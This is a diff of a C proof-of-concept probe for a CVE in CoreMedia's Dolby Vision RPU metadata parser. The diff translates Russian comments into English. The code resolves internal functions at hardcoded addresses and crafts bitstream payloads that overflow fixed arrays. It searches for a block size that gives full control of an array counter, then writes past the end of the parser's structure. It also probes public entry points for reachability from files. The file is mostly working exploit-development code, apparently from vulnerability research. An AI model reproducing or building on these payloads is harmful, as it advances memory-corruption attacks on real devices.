@@ -1,20 +1,20 @@
 // probe_rpu2.c — CVE-2026-112688 (CoreMedia DV-RPU metadata block arrays), 24A446.
 //
-// Лабораторная проба: зовём внутреннюю функцию напрямую по адресу, чтобы
-// измерить ГРАММАТИКУ БЛОКОВ и факт переполнения, не реконструируя весь
-// RPU-заголовок (он нужен отдельно, для достижимости из файла/демона).
+// Lab probe: call the internal function directly by address to measure the BLOCK
+// GRAMMAR and the overflow itself, without rebuilding the whole RPU header
+// (that header matters separately, for reachability from a file or the daemon).
 //
 //   _hevcbridgeParseVdrDmDataPayloadExMetadatatBlocks(reader, ctx, mode, out)
 //     24A446: 0x18eed3198
-//   слайд считаем от экспортируемого CMGetDMVersionLevelFromRPU (0x18efbf940).
+//   slide is computed from the exported CMGetDMVersionLevelFromRPU (0x18efbf940).
 //
-// Грамматика блока (декомпиляция 24A446):
-//   ue(size_bytes) | u(8) block_id | payload: size*8 бит
-//   id 8  -> массив C: 5 записей по 0x24 от param_4+0x726c, счётчик +0x7268
-//            (+0x7320 = начало 6-й записи = ЗА массивом)
-//   id 10 -> массив A: 4 записи по 0x1c от param_4+0x733c, счётчик +0x7334;
-//            индекс берётся из счётчика БЕЗ зажима.
-//   id 0xfe -> пишет флаг +0x71cf и уровень +0x73ad (оракул разбора).
+// Block grammar (24A446 decompilation):
+//   ue(size_bytes) | u(8) block_id | payload: size*8 bits
+//   id 8  -> array C: 5 entries of 0x24 at param_4+0x726c, counter at +0x7268
+//            (+0x7320 = start of the 6th entry = BEYOND the array)
+//   id 10 -> array A: 4 entries of 0x1c at param_4+0x733c, counter at +0x7334;
+//            the index comes from the counter WITHOUT clamping.
+//   id 0xfe -> writes flag +0x71cf and level +0x73ad (parse oracle).
 typedef unsigned long size_t;
 #include "rpu_payloads.h"
 typedef unsigned char u8;
@@ -94,7 +94,7 @@ static void reader_init(u64 *r, const u8 *bytes, size_t len) {
 
 static u8 *g_ctx, *g_mem;
 
-// Лог-колбэк парсера: (ctx, tag, value, -1) -> rc
+// Parser log callback: (ctx, tag, value, -1) -> rc
 static i32 g_trace_n = 0;
 static int g_trace_verbose = 0;
 
@@ -109,10 +109,10 @@ static i32 trace_cb(u64 ctxv, u32 tag, u32 val, i32 flag) {
 static void reset_mem(void) {
     memset(g_ctx, 0, 0x400);
     memset(g_mem, 0, 0x9000);
-    for (int i = 0x73b4; i < 0x9000; i++) g_mem[i] = 0xAA;   // канарейка за структурой
+    for (int i = 0x73b4; i < 0x9000; i++) g_mem[i] = 0xAA;   // canary past the structure
 }
 
-// блок id 8: payload = u8 + 8 x u12 = 104 бита (size 13 байт)
+// block id 8: payload = u8 + 8 x u12 = 104 bits (size 13 bytes)
 static void block8(bw *w, u32 size, u32 first, u32 seed) {
     bw_ue(w, size);
     bw_put(w, 8, 8);
@@ -181,7 +181,7 @@ int main(void) {
     u64 r[0x58 / 8];
     if (!g_ctx || !g_mem) { log_str("rpu2: oom\n"); close(g_fd); return 1; }
 
-    // ── E1: оракул — блок id 0xfe (size 2) должен дать flag=1, level=1
+    // -- E1: oracle - block id 0xfe (size 2) must yield flag=1, level=1
     {
         bw w = {0};
         bw_ue(&w, 2);
@@ -200,7 +200,7 @@ int main(void) {
         free(w.d);
     }
 
-    // ── E2: один блок id 8 (size 13) — проверяем раскладку полей
+    // -- E2: one block id 8 (size 13) - check the field layout
     {
         bw w = {0};
         block8(&w, 13, 0x21, 0x300);
@@ -213,7 +213,7 @@ int main(void) {
         free(w.d);
     }
 
-    // ── E3: 6 x id 8 (size 13) — 6-я запись должна уйти в 0x7320
+    // -- E3: 6 x id 8 (size 13) - the 6th entry must land at 0x7320
     {
         bw w = {0};
         for (int i = 0; i < 6; i++) block8(&w, 13, 0x20 + (u32)i, 0x100 * (u32)(i + 1));
@@ -226,14 +226,14 @@ int main(void) {
         free(w.d);
     }
 
-    // ── E4: размер 6-го блока id 8 варьируем — ищем вариант, где поле +0x16
-    //        тоже наше (тогда счётчик A управляемый целиком)
+    // -- E4: vary the size of the 6th block id 8 - looking for a variant where the
+    //        +0x16 field is also ours (then counter A is fully controlled)
     {
         const u32 sizes[5] = {14, 15, 19, 22, 23};
         for (int si = 0; si < 5; si++) {
             bw w = {0};
             for (int i = 0; i < 5; i++) block8(&w, 13, 0x20 + (u32)i, 0x100 * (u32)(i + 1));
-            // 6-й блок: пишем «сырой» payload нужной длины с метками
+            // 6th block: write a raw payload of the required length with markers
             bw_ue(&w, sizes[si]);
             bw_put(&w, 8, 8);
             bw_put(&w, 0x2f, 8);
@@ -250,9 +250,9 @@ int main(void) {
         }
     }
 
-    // ── E5: 6-й блок id 8 с size 14 -> A_count = 5 (0x243=5, 0x244=0, 0x245=0),
-    //        затем блок id 10 -> запись по param_4 + 0x733c + 5*0x1c = 0x73c8,
-    //        то есть на 0x14 байт ЗА концом 0x73b4-структуры.
+    // -- E5: 6th block id 8 with size 14 -> A_count = 5 (0x243=5, 0x244=0, 0x245=0),
+    //        then block id 10 -> store at param_4 + 0x733c + 5*0x1c = 0x73c8,
+    //        that is 0x14 bytes BEYOND the end of the 0x73b4 structure.
     {
         bw w = {0};
         for (int i = 0; i < 5; i++) block8(&w, 13, 0x20 + (u32)i, 0x100 * (u32)(i + 1));
@@ -264,7 +264,7 @@ int main(void) {
         bw_put(&w, 0, 8);           // 0x244 -> 0x7336
         bw_put(&w, 0, 8);           // 0x245 -> 0x7337
         for (int k = 0; k < 4; k++) bw_put(&w, 0xD0 + (u32)k, 8);
-        bw_ue(&w, 5);               // блок A: id 10, size 5
+        bw_ue(&w, 5);               // block A: id 10, size 5
         bw_put(&w, 10, 8);
         bw_put(&w, 0x41, 8);
         bw_put(&w, 0x42, 12);
@@ -279,7 +279,7 @@ int main(void) {
         free(w.d);
     }
 
-    // ── E6/E7: настоящий путь через заголовок RPU.
+    // -- E6/E7: the real path through the RPU header.
     //     ParseDolbyRPUDataRBSP(reader, ctx, struct) @ 0x18efded24
     {
         typedef i32 (*rbsp_fn)(u64 *reader, void *ctx, void *out);
@@ -305,9 +305,9 @@ int main(void) {
         }
     }
 
-    // ── E9: трассировка полей заголовка через лог-колбэк парсера.
-    //     Маска логов = u64 по ctx+0x2c; бит N включает тег 0x1be+N.
-    //     Колбэк: ctx[0x10], аргументы (ctx[0], tag, value, -1).
+    // -- E9: trace header fields through the parser log callback.
+    //     Log mask = u64 at ctx+0x2c; bit N enables tag 0x1be+N.
+    //     Callback: ctx[0x10], arguments (ctx[0], tag, value, -1).
     {
         typedef i32 (*rbsp_fn)(u64 *reader, void *ctx, void *out);
         rbsp_fn rbsp = (rbsp_fn)(slide + 0x18efded24ULL);
@@ -333,8 +333,8 @@ int main(void) {
         free(tc);
     }
 
-    // ── E11: публичный путь — CMGetDMVersionLevelFromRPU(CFDataRef).
-    //     Ожидание для oracle-пейлоада: level 1 -> возврат 3.
+    // -- E11: public path - CMGetDMVersionLevelFromRPU(CFDataRef).
+    //     Expected for the oracle payload: level 1 -> returns 3.
     {
         void *cf = dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_NOW);
         typedef const void *(*mk_t)(const void *, const u8 *, long);
@@ -360,8 +360,8 @@ int main(void) {
     }
 
     // ── E12: FigHEVCBridge_GetRPUMetadataFromRPU(bytes, len, out) @ 0x18efdec38
-    //     — сам инициализирует reader и ctx, зовёт ParseDolbyRPUDataRBSP.
-    //     Плюс варианты с паддингом (вдруг парсеру нужно больше бит).
+    //     - initialises reader and ctx itself, calls ParseDolbyRPUDataRBSP.
+    //     Plus padding variants (in case the parser wants more bits).
     {
         typedef i32 (*fromrpu_fn)(const u8 *bytes, u64 len, void *out);
         fromrpu_fn fr = (fromrpu_fn)(slide + 0x18efdec38ULL);
@@ -389,7 +389,7 @@ int main(void) {
         }
     }
 
-    // ── E13: те же пейлоады с хвостом из нулей (проверка «дотягивания» выравнивания)
+    // -- E13: same payloads with a zero tail (checks alignment pull-in)
     {
         typedef i32 (*fromrpu_fn)(const u8 *bytes, u64 len, void *out);
         fromrpu_fn fr = (fromrpu_fn)(slide + 0x18efdec38ULL);
